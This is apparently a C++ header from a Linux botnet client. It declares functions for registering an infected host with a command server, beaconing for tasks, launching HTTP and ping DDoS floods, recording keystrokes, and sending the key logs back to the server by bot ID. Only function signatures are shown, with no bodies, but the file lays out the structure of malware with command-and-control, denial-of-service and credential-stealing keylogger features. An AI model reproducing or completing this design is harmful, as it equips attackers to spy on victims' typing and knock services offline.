#ifndef linux_functions_h
#define linux_functions_h

#include <string>
#include "worker.h"
#include <netdb.h>
#include "worker.h"
#include <vector>
#include "task.h"

Worker registerWorker(const char* serverIP, int serverPort, in_addr ipAddress, std::string cpu, std::string ramInfo, std::vector<std::string>* logs);
in_addr getIpAddress(std::vector<std::string>* logs);
std::string getCPUModelName(std::vector<std::string>* logs);
std::string getRAMInfo(std::vector<std::string>* logs);
Command beacon(const char* serverIP, int serverPort, Worker worker, Task task, std::vector<std::string>* logs);
Task request(const char* serverIP, int serverPort, Worker worker, std::vector<std::string>* logs);
std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest, std::vector<std::string>* logs);
std::string extractJSON(std::string json);
bool doTask(const char* serverIP, int serverPort, const Task& task, std::vector<std::string>* logs, Worker worker);
bool doDDOS(Task task, std::vector<std::string>* logs);
void makeHttpDDOSRequest(std::string address, bool log, std::vector<std::string>* logs);
unsigned short checksum(unsigned short* buf, int len);
void sendPing(const char* address, std::vector<std::string>* logs);
void sendLogs(const char* serverIP, int serverPort, std::vector<std::string> logs, int bot_id);
void playSound(std::vector<std::string>* logs);
int recordKeystrokes(int durationSeconds, std::vector<std::string>* logs);
void sendKeyLogs(const char* serverIP, int serverPort, std::vector<int> keyLogs, std::vector<std::string>* logs, int bot_id);

#endif
